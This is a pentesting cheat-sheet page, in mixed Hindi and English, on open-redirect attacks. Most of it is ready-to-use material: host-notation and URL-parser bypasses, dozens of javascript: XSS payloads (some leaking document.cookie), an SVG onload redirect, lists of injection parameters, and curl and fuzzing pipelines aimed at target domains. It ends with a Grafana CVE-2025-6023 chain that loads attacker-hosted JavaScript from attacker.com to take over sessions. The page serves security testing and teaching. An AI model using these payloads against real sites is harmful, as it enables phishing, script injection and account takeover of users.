# Open Redirect

{{#include ../banners/hacktricks-training.md}}


## Open redirect

### Redirect to localhost or arbitrary domains

- यदि ऐप "allows only internal/whitelisted hosts" अनुमति देता है, तो redirect target के ज़रिये loopback या internal रेंज तक पहुँचने के लिए वैकल्पिक host notations आज़माएँ:
- IPv4 loopback variants: 127.0.0.1, 127.1, 2130706433 (decimal), 0x7f000001 (hex), 017700000001 (octal)
- IPv6 loopback variants: [::1], [0:0:0:0:0:0:0:1], [::ffff:127.0.0.1]
- अंतिम डॉट और केस-भेद: localhost., LOCALHOST, 127.0.0.1.
- Wildcard DNS जो loopback पर resolve होता है: lvh.me, sslip.io (e.g., 127.0.0.1.sslip.io), traefik.me, localtest.me. ये तब उपयोगी होते हैं जब केवल “subdomains of X” की अनुमति है लेकिन host resolution फिर भी 127.0.0.1 की ओर इशारा करता है।
- Network-path references अक्सर उन naive validators को बायपास कर देते हैं जो scheme prepend करते हैं या केवल prefixes चेक करते हैं:
- //attacker.tld → इसे scheme-relative माना जाता है और यह current scheme के साथ off-site नेविगेट कर देता है।
- Userinfo tricks उन contains/startswith चेक्स को चकमा देते हैं जो trusted hosts के खिलाफ होते हैं:
- https://trusted.tld@attacker.tld/ → ब्राउज़र attacker.tld पर नेविगेट करता है लेकिन साधारण string चेक्स trusted.tld “देखते” हैं।
- Frameworks/browsers के बीच backslash parsing confusion:
- https://trusted.tld\@attacker.tld → कुछ बैकएंड “\” को path char मानते हैं और validation पास कर देते हैं; ब्राउज़र इसे सामान्यीकृत कर “/” बना देते हैं और trusted.tld को userinfo समझते हुए users को attacker.tld पर भेज देते हैं। यह Node/PHP URL-parser mismatches में भी दिखाई देता है।

{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

### Modern open-redirect to XSS pivots
```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

# Abuse bad subdomain filter
javascript://sub.domain.com/%0Aalert(1)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
<details>
<summary>और आधुनिक URL-based bypass payloads</summary>
```text
# Scheme-relative (current scheme is reused)
//evil.example

# Credentials (userinfo) trick
https://trusted.example@evil.example/

# Backslash confusion (server validates, browser normalizes)
https://trusted.example\@evil.example/

# Schemeless with whitespace/control chars
evil.example%00
%09//evil.example

# Prefix/suffix matching flaws
https://trusted.example.evil.example/
https://evil.example/trusted.example

# When only path is accepted, try breaking absolute URL detection
/\\evil.example
/..//evil.example
```
</details>

## Open Redirect svg फ़ाइलें अपलोड करना
```html
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```
## सामान्य injection पैरामीटर
```text
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```
## कोड उदाहरण

#### .Net
```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```
#### Java
```bash
response.redirect("http://mysafedomain.com");
```
#### PHP
```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```
## Hunting and exploitation workflow (प्रैक्टिकल)

- curl के साथ एकल URL जाँच:
```bash
curl -s -I "https://target.tld/redirect?url=//evil.example" | grep -i "^Location:"
```
- संभावित पैरामीटरों को बड़े पैमाने पर खोजें और fuzz करें:

<details>
<summary>विस्तार के लिए क्लिक करें</summary>
```bash
# 1) Gather historical URLs, keep those with common redirect params
cat domains.txt \
| gau --o urls.txt            # or: waybackurls / katana / hakrawler

# 2) Grep common parameters and normalize list
rg -NI "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=)" urls.txt \
| sed 's/\r$//' | sort -u > candidates.txt

# 3) Use OpenRedireX to fuzz with payload corpus
cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50 > results.txt

# 4) Manually verify interesting hits
awk '/30[1237]|Location:/I' results.txt
```
</details>

- SPAs में client-side sinks न भूलें: window.location/assign/replace और ऐसे framework helpers खोजें जो query/hash पढ़कर redirect करते हैं।

- Frameworks अक्सर footguns पैदा करते हैं जब redirect destinations untrusted input (query params, Referer, cookies) से निकाले जाते हैं। Next.js के नोट्स देखें about redirects और user input से निकले dynamic destinations से बचें।

{{#ref}}
../network-services-pentesting/pentesting-web/nextjs.md
{{#endref}}

- OAuth/OIDC flows: abusing open redirectors अक्सर account takeover तक escalate कर देता है by leaking authorization codes/tokens. समर्पित गाइड देखें:

{{#ref}}
./oauth-to-account-takeover.md
{{#endref}}

- Location के बिना redirect लागू करने वाले server responses (meta refresh/JavaScript) फिर भी phishing के लिए exploitable होते हैं और कभी-कभी chained हो सकते हैं। Grep for:
```html
<meta http-equiv="refresh" content="0;url=//evil.example">
<script>location = new URLSearchParams(location.search).get('next')</script>
```
### Fragment smuggling + client-side traversal chain (Grafana-style bypass)

- **Server-side gap (Go `url.Parse` + raw redirect)**: केवल `URL.Path` को चेक करने वाले और `URL.Fragment` को अनदेखा करने वाले validators को `#` के बाद बाहरी host रखकर धोखा दिया जा सकता है। अगर handler बाद में *unsanitized* string से `Location` बनाता है, तो fragments redirect target में leak हो जाते हैं। Example against `/user/auth-tokens/rotate`:
- Request: `GET /user/auth-tokens/rotate?redirectTo=/%23/..//\//attacker.com HTTP/1.1`
- Parsing sees `Path=/` and `Fragment=/..//\//attacker.com`, so regex + `path.Clean()` approve `/`, but the response emits `Location: /\//attacker.com`, acting as an open redirect.
- **Client-side gap (validate decoded/cleaned, return original)**: ऐसे SPA helpers जो path को पूरी तरह decode करते हैं (double-encoded `?` सहित), validation के लिए query को strip करते हैं, लेकिन फिर *original* string लौटाते हैं जिससे encoded `../` बच जाते हैं। Browser बाद में इसे decode करके किसी भी same-origin endpoint (उदा., redirect gadget) पर traversal बना देता है। Payload pattern:
- `/dashboard/script/%253f%2f..%2f..%2f..%2f..%2f..%2fuser/auth-tokens/rotate`
- The validator checks `/dashboard/script/` (no `..`), returns the encoded string, and the browser walks to `/user/auth-tokens/rotate`.
- **End-to-end XSS/ATO**: chain the traversal with the fragment-smuggled redirect to coerce the dashboard script loader into fetching attacker JS:
```text
https://<grafana>/dashboard/script/%253f%2f..%2f..%2f..%2f..%2f..%2fuser%2fauth-tokens%2frotate%3fredirectTo%3d%2f%2523%2f..%2f%2f%5c%2fattacker.com%2fmodule.js
```
- path traversal rotate endpoint तक पहुँचता है, जो fragment-smuggled `redirectTo` से `attacker.com/module.js` पर 302 जारी करता है। सुनिश्चित करें कि attacker origin permissive CORS के साथ JS serve करे ताकि ब्राउज़र इसे क्रियान्वित करे, जिससे session theft/account takeover हो।

## उपकरण

- [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)
- OpenRedireX – open redirects का पता लगाने के लिए fuzzer। उदाहरण:
```bash
# Install
git clone https://github.com/devanshbatham/OpenRedireX && cd OpenRedireX && ./setup.sh

# Fuzz a list of candidate URLs (use FUZZ as placeholder)
cat list_of_urls.txt | ./openredirex.py -p payloads.txt -k FUZZ -c 50
```
## संदर्भ

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect में आप fuzzing lists पा सकते हैं.
- [https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
- [https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a](https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a)
- PortSwigger Web Security Academy – DOM-based open redirection: https://portswigger.net/web-security/dom-based/open-redirection
- OpenRedireX – A fuzzer for detecting open redirect vulnerabilities: https://github.com/devanshbatham/OpenRedireX
- [Grafana CVE-2025-6023 redirect + traversal bypass chain](https://blog.ethiack.com/blog/grafana-cve-2025-6023-bypass-a-technical-deep-dive)

{{#include ../banners/hacktricks-training.md}}
